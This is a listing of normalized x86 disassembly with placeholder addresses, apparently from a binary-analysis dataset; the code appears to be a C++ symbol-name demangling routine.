lea ecx [ ebp - 0x2c ]
push 0x20
mov [ ebp - 0x28 ] eax
call sub_410f18
mov eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_410ed5
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
mov eax ebx
je r-xdata
test esi esi
je r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
test bl 0x2
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_4123fe
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call sub_4110b8
mov edx [ ebp - 0x10 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
lea eax [ ebp - 0x14 ]
push eax
je r-xdata
test bl 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_4123fe
pop ecx
mov ecx eax
call sub_410e2b
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_41102e
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x54 ]
push eax
call sub_4149f6
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call sub_4110b8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_41085d
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_4149f6
pop ecx
mov ecx eax
call sub_410e2b
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov al [ ebp - 0x2 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
inc eax
mov [ rw-data ] eax
cmp cl 0x40
je r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov al [ ebp - 0x3 ]
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x2c ]
push r--data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
call sub_410fcd
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edi 0x100
test esi esi
jne r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x2c ]
push r--data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
call sub_410fcd
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
or edx edi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
xor ecx ecx
cmp [ esi ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
or edx 0x2000
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
test [ esi + 0x4 ] edi
jne r-xdata
push eax
test [ esi + 0x4 ] 0x800
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
push esi
jmp r-xdata
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push eax
lea eax [ ebp - 0x2c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x28 ]
push 0x20
mov [ ebp - 0x30 ] eax
call sub_410f18
push esi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410e2b
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_410ed5
mov edx [ ebp - 0x10 ]
sub_412f77
push ebp
mov ebp esp
sub esp 0x10
xor ecx ecx
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push ecx
push eax
push r--data
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ecx
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
call sub_412955
mov eax [ ebp + 0x8 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_412fb3
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_4107d6
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
push 0x1
call sub_41085d
cmp cl 0x3f
je r-xdata
and [ ebp - 0x10 ] 0x0
inc eax
and [ ebp - 0xc ] 0xffff0000
mov [ rw-data ] eax
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push r--data
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_412955
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4144e0
add esp 0x1c
jmp r-xdata
cmp cl 0x58
je r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
inc eax
cmp [ ebp - 0x8 ] 0x0
mov [ rw-data ] eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4144e0
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
push r--data
call sub_410823
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410823
jmp r-xdata
mov ecx eax
call sub_410e2b
sub_413085
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x24
push ebx
push esi
mov esi 0x2000
push edi
test esi eax
je r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
cmp cl 0x3f
jne r-xdata
and eax 0xffffdfff
mov [ rw-data ] eax
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_412fb3
or [ rw-data ] esi
pop ecx
pop ecx
test cl cl
jne r-xdata
inc eax
mov [ rw-data ] eax
cmp [ eax ] cl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x2
jmp r-xdata
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_415141
mov esi [ ebp - 0xc ]
xor eax eax
mov ebx [ ebp - 0x8 ]
inc eax
pop ecx
test esi esi
je r-xdata
cmp [ eax + 0x1 ] cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
and [ ebp - 0x4 ] 0x0
test ebx 0x200
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_413085
mov eax [ rw-data ]
pop ecx
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
cmp al 0x40
je r-xdata
mov edi ebx
shr edi 0xf
and edi eax
cmp bl 0x1
jle r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
mov edx 0x8000
test edi edi
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4149f6
mov eax [ ebp - 0x24 ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
test esi esi
je r-xdata
or ebx edx
mov [ ebp - 0x8 ] ebx
or ebx 0x200
mov [ ebp - 0x8 ] ebx
cmp [ rw-data ] 0x0
je r-xdata
mov edi 0x1000
test edi ebx
jne r-xdata
mov [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
push r--data
mov [ ebp - 0x18 ] eax
call sub_410fcd
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_410ed5
mov esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
lea eax [ ebp - 0x24 ]
mov [ rw-data ] 0x0
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] ebx
call sub_410ed5
mov eax [ rw-data ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
cmp [ eax ] 0x40
mov [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4149f6
mov [ esp ] r--data
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
call sub_410fcd
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_410ed5
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
jmp r-xdata
test [ rw-data ] edi
je r-xdata
cmp al 0x40
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_41118d
pop ecx
pop ecx
jmp r-xdata
test ecx ecx
jne r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x8 ]
test edx ebx
jne r-xdata
and [ ebp - 0x24 ] ecx
lea eax [ ebp - 0x24 ]
and [ ebp - 0x20 ] 0xffff0000
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_41118d
pop ecx
pop ecx
jmp r-xdata
sub_4132d1
push ebp
mov ebp esp
mov ecx [ rw-data ]
sub esp 0x18
push esi
xor esi esi
cmp [ ecx ] 0x51
push edi
mov edi esi
jne r-xdata
mov al [ ecx ]
test al al
jne r-xdata
inc ecx
mov edi r--data
mov [ rw-data ] ecx
cmp al 0x30
jl r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41085d
mov eax [ ebp + 0x8 ]
jmp r-xdata
push ebx
mov ebx esi
jmp r-xdata
cmp al 0x39
jg r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x40
jne r-xdata
movsx eax al
sub eax 0x2f
inc ecx
cdq
mov [ rw-data ] ecx
push edx
push eax
test edi edi
je r-xdata
test al al
je r-xdata
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_410944
lea ecx [ ebp - 0x8 ]
call sub_410944
push eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_410de3
add esp 0xc
jmp r-xdata
push 0x1
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
je r-xdata
push 0x2
mov edx eax
mov eax [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp al 0x50
jg r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
pop ebx
movsx eax al
shld ebx esi 0x4
sub eax 0x41
cdq
shl esi 0x4
add eax esi
mov esi eax
adc ebx edx
inc ecx
mov [ rw-data ] ecx
mov al [ ecx ]
lea ecx [ ebp - 0x8 ]
call sub_410944
lea ecx [ ebp - 0x18 ]
call sub_410944
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_4108b1
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call sub_4108b1
push eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_410de3
add esp 0xc
jmp r-xdata
mov edx eax
mov eax [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_413408
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
pop ebp
retn
cmp al 0x5f
jne r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp al 0x5f
jne r-xdata
add ecx 0x2
mov [ rw-data ] ecx
movsx eax [ ecx ]
sub eax 0x41
inc ecx
mov [ rw-data ] ecx
cmp eax 0x3
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_413477
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x20
mov edx eax
shr edx 0xf
not edx
push ebx
push esi
xor esi esi
inc esi
and edx esi
je r-xdata
xor esi esi
test eax 0x1000
je r-xdata
dec ecx
mov [ rw-data ] ecx
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410823
mov eax [ ebp + 0x8 ]
sub eax 0x54
je r-xdata
mov ecx [ rw-data ]
mov ebx 0xffff0000
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] ebx
movsx eax [ ecx ]
inc ecx
mov [ rw-data ] ecx
sub eax 0x0
je r-xdata
push r--data
sub eax 0x1
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_414dd4
pop ecx
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_410ed5
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
call sub_410ba1
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
lea eax [ ebp - 0x18 ]
mov esi edx
push eax
call sub_4135a5
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax 0x1
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] ebx
test esi esi
je r-xdata
push r--data
jmp r-xdata
sub eax 0x1
jne r-xdata
push r--data
jmp r-xdata
sub_4135a5
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0xffff0000
mov al [ eax ]
test al al
je r-xdata
push 0x1
movsx eax al
add eax 0xffffffd0
cmp eax 0x7
ja r-xdata
push 0x2
jmp r-xdata
jmp [ eax * 4 + jump_table_413671 ]
mov ecx [ ebp + 0x8 ]
call sub_41085d
mov eax [ ebp + 0x8 ]
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov eax [ rw-data ]
movsx eax [ eax ]
inc [ rw-data ]
sub eax 0x31
je r-xdata
lea ecx [ ebp - 0x8 ]
call sub_410ba1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
dec eax
sub eax 0x1
je r-xdata
mov esp ebp
pop ebp
retn
dec eax
sub eax 0x1
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_413691
push ebp
mov ebp esp
sub esp 0x18
mov edx [ rw-data ]
push ebx
push esi
mov esi [ ebp - 0x4 ]
xor ebx ebx
and esi 0xffff0000
mov [ ebp - 0x8 ] ebx
inc edx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edx
push edi
mov cl [ edx ]
movsx edi cl
mov eax edi
sub eax 0x41
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
sub eax 0x1
je r-xdata
inc edx
mov [ rw-data ] edx
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
cmp [ eax ] 0x26
jne r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
sub eax 0x1
je r-xdata
mov eax [ ecx ]
cmp [ eax ] 0x2a
jne r-xdata
mov [ ecx ] r--data
mov edx [ rw-data ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push 0x3e
mov [ eax ] 0x1
call sub_410b2c
push 0x2
mov eax [ ebp + 0xc ]
mov [ eax ] r--data
jmp r-xdata
test cl cl
je r-xdata
mov [ ecx ] r--data
mov edx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] bl
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc [ rw-data ]
jmp r-xdata
push 0x1
jmp r-xdata
mov al [ edx + 0x1 ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
lea ecx [ edi - 0x30 ]
add edx 0x2
shl ecx 0x4
add ecx 0xffffffd0
movsx edi al
add edi ecx
mov [ rw-data ] edx
cmp edi 0x1
jbe r-xdata
push 0x3e
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] esi
call sub_410f18
mov eax [ rw-data ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
cmp [ eax ] 0x24
mov [ ebp - 0x4 ] ecx
jne r-xdata
push 0x2c
lea ecx [ ebp - 0x8 ]
call sub_410b2c
push ebx
push edi
lea ecx [ ebp - 0x10 ]
call sub_410944
push eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410e2b
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x10 ]
push 0x5e
mov [ ebp - 0x10 ] edx
call sub_410f18
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
inc eax
mov [ rw-data ] eax
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_41102e
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
inc eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
or ecx 0x4000
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_41383a
push ebp
mov ebp esp
sub esp 0x18
mov ecx rw-data
push esi
push 0x0
push 0x8
call sub_413d8f
mov esi eax
test esi esi
je r-xdata
xor esi esi
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
jmp r-xdata
push esi
push [ ebp + 0x8 ]
call sub_412fb3
lea eax [ ebp - 0x10 ]
push eax
call sub_412f77
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
push 0x20
call sub_410f18
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410e2b
mov ecx [ eax ]
mov [ esi ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
sub_4138b3
push ebp
mov ebp esp
mov ecx [ rw-data ]
sub esp 0x38
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x36
jl r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e07
add esp 0xc
cmp al 0x5f
je r-xdata
cmp al 0x39
jle r-xdata
mov esp ebp
pop ebp
retn
push ebx
movsx ebx al
sub ebx 0x36
inc ecx
mov [ rw-data ] ecx
cmp ebx 0x29
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
jmp r-xdata
test ebx ebx
js r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
or ebx 0xffffffff
cmp ebx 0x3
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e07
add esp 0xc
jmp r-xdata
movsx ebx al
sub ebx 0x3d
inc ecx
mov [ rw-data ] ecx
cmp ebx 0x4
jl r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0xffff0000
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ebx
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] eax
and edi 0x2
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp ebx 0x7
jmp r-xdata
test bl 0x4
je r-xdata
cmp [ ecx ] 0x40
je r-xdata
pop ebx
jle r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
inc ecx
mov [ rw-data ] ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_412896
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_4110b8
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_412896
pop ecx
mov ecx eax
call sub_410e2b
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_4123fe
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_4110b8
call sub_4123fe
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x30 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410ed5
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
push 0x1
call sub_41085d
mov ecx eax
call sub_410e2b
jmp r-xdata
cmp al 0x40
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_41085d
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
lea eax [ ebp - 0x30 ]
push eax
call sub_4149f6
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410ed5
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
jmp r-xdata
push ebx
push 0x8
mov ecx rw-data
call sub_413d8f
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
mov [ ebp - 0x14 ] eax
call sub_410f18
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
jmp r-xdata
mov eax [ rw-data ]
inc ecx
and eax 0x60
mov [ rw-data ] ecx
cmp al 0x60
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov esi ebx
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
call sub_4158d0
pop ecx
push eax
lea ecx [ ebp - 0x10 ]
call sub_4110b8
jmp r-xdata
call sub_4158d0
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
shr ecx 0x13
lea eax [ ebp - 0x38 ]
not ecx
push eax
test cl 0x1
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_4149c7
lea eax [ ebp - 0x38 ]
push eax
call sub_41211c
add esp 0xc
lea ecx [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
mov [ ebp - 0x14 ] eax
call sub_410f18
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
mov ecx [ rw-data ]
mov eax ecx
and eax 0x60
cmp al 0x60
je r-xdata
call sub_4148d5
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_4110b8
call sub_4148d5
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
jmp r-xdata
